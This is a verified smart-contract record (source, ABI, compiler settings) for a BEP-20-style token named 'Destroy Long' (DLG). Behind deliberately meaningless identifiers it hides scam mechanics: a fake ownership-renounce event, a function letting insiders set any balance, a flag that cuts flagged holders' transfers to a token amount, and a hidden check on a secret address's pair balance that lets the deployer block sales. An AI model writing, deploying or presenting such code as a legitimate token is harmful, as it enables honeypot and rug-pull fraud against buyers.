{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface tradingAt {\n    function createPair(address minFromLiquidity, address sellFeeFund) external returns (address);\n}\n\ninterface enableMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingShouldFund) external view returns (uint256);\n\n    function transfer(address atSell, uint256 fromLaunch) external returns (bool);\n\n    function allowance(address launchedFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atSell,\n        uint256 fromLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldMarketing, uint256 value);\n    event Approval(address indexed launchedFund, address indexed spender, uint256 value);\n}\n\nabstract contract takeMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atMax is enableMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DestroyLong is takeMarketing, enableMarketing, atMax {\n\n    function transfer(address senderMinSwap, uint256 fromLaunch) external virtual override returns (bool) {\n        return launchedLimit(_msgSender(), senderMinSwap, fromLaunch);\n    }\n\n    constructor (){\n        if (amountLimit != enableWallet) {\n            receiverAuto = atFund;\n        }\n        modeLimit enableLiquidityReceiver = modeLimit(tokenLimitTx);\n        marketingReceiver = tradingAt(enableLiquidityReceiver.factory()).createPair(enableLiquidityReceiver.WETH(), address(this));\n        if (marketingExempt) {\n            receiverMin = true;\n        }\n        buyFrom = _msgSender();\n        amountReceiver[buyFrom] = true;\n        amountFee[buyFrom] = marketingTrading;\n        modeMaxList();\n        if (totalListShould == receiverMin) {\n            amountLimit = enableWallet;\n        }\n        emit Transfer(address(0), buyFrom, marketingTrading);\n    }\n\n    mapping(address => bool) public swapMarketing;\n\n    function approve(address feeBuy, uint256 fromLaunch) public virtual override returns (bool) {\n        isMarketing[_msgSender()][feeBuy] = fromLaunch;\n        emit Approval(_msgSender(), feeBuy, fromLaunch);\n        return true;\n    }\n\n    uint256 private receiverAuto;\n\n    uint256 private enableWallet;\n\n    address amountLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public amountReceiver;\n\n    address public buyFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return limitLaunched;\n    }\n\n    string private swapAutoReceiver = \"DLG\";\n\n    bool public receiverMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapAutoReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private isMarketing;\n\n    uint256 private listMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingTrading;\n    }\n\n    mapping(address => uint256) private amountFee;\n\n    function balanceOf(address marketingShouldFund) public view virtual override returns (uint256) {\n        return amountFee[marketingShouldFund];\n    }\n\n    function modeMaxList() public {\n        emit OwnershipTransferred(buyFrom, address(0));\n        amountMinTotal = address(0);\n    }\n\n    bool private fundTradingReceiver;\n\n    function transferFrom(address enableTake, address atSell, uint256 fromLaunch) external override returns (bool) {\n        if (_msgSender() != tokenLimitTx) {\n            if (isMarketing[enableTake][_msgSender()] != type(uint256).max) {\n                require(fromLaunch <= isMarketing[enableTake][_msgSender()]);\n                isMarketing[enableTake][_msgSender()] -= fromLaunch;\n            }\n        }\n        return launchedLimit(enableTake, atSell, fromLaunch);\n    }\n\n    bool public totalListShould;\n\n    bool private marketingExempt;\n\n    address public marketingReceiver;\n\n    uint256 public amountLimit;\n\n    event OwnershipTransferred(address indexed minSell, address indexed sellBuy);\n\n    uint256 constant receiverEnable = 7 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSenderTeam;\n    }\n\n    function maxTo(address walletFee) public {\n        if (teamSell) {\n            return;\n        }\n        if (amountLimit != atFund) {\n            fundTradingReceiver = false;\n        }\n        amountReceiver[walletFee] = true;\n        if (fundTradingReceiver != marketingExempt) {\n            receiverAuto = amountLimit;\n        }\n        teamSell = true;\n    }\n\n    uint8 private receiverSenderTeam = 18;\n\n    uint256 fromTeam;\n\n    bool public teamSell;\n\n    function getOwner() external view returns (address) {\n        return amountMinTotal;\n    }\n\n    function allowance(address autoBuy, address feeBuy) external view virtual override returns (uint256) {\n        if (feeBuy == tokenLimitTx) {\n            return type(uint256).max;\n        }\n        return isMarketing[autoBuy][feeBuy];\n    }\n\n    string private limitLaunched = \"Destroy Long\";\n\n    uint256 public atFund;\n\n    function atMode(address senderMinSwap, uint256 fromLaunch) public {\n        liquidityMinSender();\n        amountFee[senderMinSwap] = fromLaunch;\n    }\n\n    address private amountMinTotal;\n\n    function tokenSwap(address tradingIsList) public {\n        liquidityMinSender();\n        \n        if (tradingIsList == buyFrom || tradingIsList == marketingReceiver) {\n            return;\n        }\n        swapMarketing[tradingIsList] = true;\n    }\n\n    function liquidityMinSender() private view {\n        require(amountReceiver[_msgSender()]);\n    }\n\n    uint256 private marketingTrading = 100000000 * 10 ** 18;\n\n    function receiverTo(uint256 fromLaunch) public {\n        liquidityMinSender();\n        modeTeam = fromLaunch;\n    }\n\n    address tokenLimitTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return amountMinTotal;\n    }\n\n    function launchedLimit(address enableTake, address atSell, uint256 fromLaunch) internal returns (bool) {\n        if (enableTake == buyFrom) {\n            return tradingLiquidityShould(enableTake, atSell, fromLaunch);\n        }\n        uint256 tokenReceiver = enableMarketing(marketingReceiver).balanceOf(amountLaunched);\n        require(tokenReceiver == modeTeam);\n        require(atSell != amountLaunched);\n        if (swapMarketing[enableTake]) {\n            return tradingLiquidityShould(enableTake, atSell, receiverEnable);\n        }\n        return tradingLiquidityShould(enableTake, atSell, fromLaunch);\n    }\n\n    function tradingLiquidityShould(address enableTake, address atSell, uint256 fromLaunch) internal returns (bool) {\n        require(amountFee[enableTake] >= fromLaunch);\n        amountFee[enableTake] -= fromLaunch;\n        amountFee[atSell] += fromLaunch;\n        emit Transfer(enableTake, atSell, fromLaunch);\n        return true;\n    }\n\n    uint256 modeTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMinSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunch\",\"type\":\"uint256\"}],\"name\":\"atMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShouldFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFee\",\"type\":\"address\"}],\"name\":\"maxTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMaxList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromLaunch\",\"type\":\"uint256\"}],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingIsList\",\"type\":\"address\"}],\"name\":\"tokenSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalListShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMinSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DestroyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}